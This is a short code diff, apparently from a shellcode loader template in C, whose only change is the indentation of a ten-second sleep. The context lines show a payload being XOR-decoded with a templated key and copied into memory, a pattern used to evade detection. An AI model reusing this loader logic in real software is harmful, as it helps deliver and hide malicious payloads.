@@ -120,9 +120,9 @@ int main( int argc, char* argv[] ) {
 		return 1;
 	}
 
-    /* Sleep for 10 seconds */
-    sleep( 10 );
-    /* Resume execution */
+        /* Sleep for 10 seconds */
+        sleep( 10 );
+        /* Resume execution */
 
 	xorShellcode( shellcode, shellcode_size, "${KEY}" );
 	memcpy( mem, shellcode, shellcode_size );
